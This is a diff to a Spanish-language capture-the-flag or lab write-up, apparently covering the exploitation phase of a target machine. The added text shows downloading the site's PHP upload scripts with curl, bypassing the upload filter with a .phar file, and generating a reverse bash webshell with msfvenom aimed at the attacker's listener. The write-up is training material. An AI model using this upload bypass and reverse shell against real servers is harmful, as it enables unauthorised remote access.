@@ -44,11 +44,20 @@ ___
 
 #### FASE EXPLOTACIÓN (Ganar Acesso):  
 
-Una vez Enumerados todos los Servicios. Pasamos a intentar Ganar Acceso. Pareciera que el camino para lograrlo es intentar subir un archivo malicioso de alguna manera y, probando y probando, no lo conseguimos. Por lo tanto, pasamos a descargar los recursos PHP que son los que tienen la lógica de dicha función. Lo hacemos de la siguiente manera:  
+Una vez Enumerados todos los Servicios. Pasamos a intentar Ganar Acceso. Pareciera que el camino para lograrlo es intentar subir un archivo malicioso de alguna manera. Por lo tanto, pasamos a descargar los recursos PHP que son los que tienen la lógica de dicha función. Lo hacemos de la siguiente manera:  
 
-* curl -O http://<IP>/file_upload.php
-* curl -O http://<IP>/subir_archivo.php
+* `curl -O http://<IP>/file_upload.php`
+* `curl -O http://<IP>/subir_archivo.php`
 
+Revisándolos localmente con `cat` o `less`, vemos que no dice nada relevante en cuanto al formato de archivo aceptado. Entonces, intentamos con archivos `.phar` y tenemos éxito.  
+
+> Los archivos PHAR son como empaquetados de PHP que pueden tener código ejecutable, entre otras cosas. Por lo cual, es una manera alternativa de correr una WebShell.
+
+Ahora, teniendo en cuenta esto, pasamos a crear la webshell con msfvemom:  
+
+`msfvenom -p php/unix/cmd/reverse_bash LHOST=<IP_local> LPORT=<puerto_local> R -o webshell.php.phar`  
+
+> Usamos dicho payload para poder recibir la conexión con alguna otra herramienta alternativa a Meterpreter para variar.  
 
 ___
 
